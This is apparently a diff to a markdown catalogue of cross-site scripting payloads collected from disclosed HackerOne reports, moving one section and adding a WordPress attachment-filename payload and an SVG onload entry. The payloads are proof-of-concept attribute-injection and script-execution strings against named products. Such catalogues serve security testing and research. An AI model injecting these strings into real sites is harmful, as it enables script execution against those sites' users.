@@ -1,6 +1,6 @@
 # Cross-site Scripting
 
-809 payloads from disclosed reports.
+811 payloads from disclosed reports.
 
 ## Reflected XSS via javascript: URI in referer parameter
 
@@ -2192,6 +2192,45 @@ https://www.████████.mil/?code=%27;prompt(%27XSS%27
 — [XSS found in https://www.████████.mil](https://hackerone.com/reports/2853410) · U.S. Dept Of Defense · [thpless](https://hackerone.com/thpless)
 
 
+## Stored XSS via attribute injection in the SEO Name field (onmouseover event)
+
+### `d18883ea`
+
+```
+<a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>
+```
+
+— [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349) · GitLab · [vakzz](https://hackerone.com/vakzz) · $13,950.0
+
+### `5ef1a686`
+
+```
+" onmouseover="alert('Stored XSS in SEO Name field')"
+```
+
+**Parameter:** `Name`
+— [Stored XSS in Pages SEO dialog Name field (concrete5 8.1.0)](https://hackerone.com/reports/230029) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)
+
+### `99f73bc5`
+
+```
+5. You can place an XSS stored payload on the users profile in the first name field using ant" autofocus onfocus=prompt(1) x="
+```
+
+— [Account takeover leading to PII chained with stored XSS](https://hackerone.com/reports/1483201) · U.S. General Services Administration · [imthatt](https://hackerone.com/imthatt)
+
+### `6d810f40`
+
+```
+{"sub_sizes":[{"image_size":"thumbnail",
+  "file":"a.jpg' /><svg onload='document.title=\"XSS-EXECUTED-\"+document.domain'></svg><b x='",
+  "width":150,"height":150,"mime_type":"image/jpeg","filesize":1}]}
+```
+
+**Parameter:** `file`
+— [Author → stored XSS in wp-admin: unescaped sub-size filename from attachment metadata breaks out of the `src` attribute in `get_media_item()`](https://hackerone.com/reports/3931771) · WordPress · [jakubk](https://hackerone.com/jakubk)
+
+
 ## Stored XSS via HTML attribute injection using an <img> onerror handler
 
 ### `dba4c847`
@@ -2602,34 +2641,6 @@ https://██████████/██████=%3C/script%3E%3Cscript
 
 **Parameter:** `emailbody`
 — [Reflected XSS in ██████](https://hackerone.com/reports/1873655) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)
-
-
-## Stored XSS via attribute injection in the SEO Name field (onmouseover event)
-
-### `d18883ea`
-
-```
-<a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>
-```
-
-— [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349) · GitLab · [vakzz](https://hackerone.com/vakzz) · $13,950.0
-
-### `5ef1a686`
-
-```
-" onmouseover="alert('Stored XSS in SEO Name field')"
-```
-
-**Parameter:** `Name`
-— [Stored XSS in Pages SEO dialog Name field (concrete5 8.1.0)](https://hackerone.com/reports/230029) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)
-
-### `99f73bc5`
-
-```
-5. You can place an XSS stored payload on the users profile in the first name field using ant" autofocus onfocus=prompt(1) x="
-```
-
-— [Account takeover leading to PII chained with stored XSS](https://hackerone.com/reports/1483201) · U.S. General Services Administration · [imthatt](https://hackerone.com/imthatt)
 
 
 ## Stored XSS via directory name injection
@@ -8808,6 +8819,17 @@ http://127.0.0.1:6060/%22%3E%3Csvg%20onload=alert(5);%3E/
 ```
 
 — [XSS on $shop$.target.com/admin/ and evil.com via whitelist bypass in SVG icon for sales channel applications](https://hackerone.com/reports/232174) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $5,000.0
+
+
+## SVG onload attribute JavaScript execution (HTML injection XSS)
+
+### `af53af77`
+
+```
+<svg onload=…>
+```
+
+— [Author → stored XSS in wp-admin: unescaped sub-size filename from attachment metadata breaks out of the `src` attribute in `get_media_item()`](https://hackerone.com/reports/3931771) · WordPress · [jakubk](https://hackerone.com/jakubk)
 
 
 ## SVG onload attribute XSS on line element
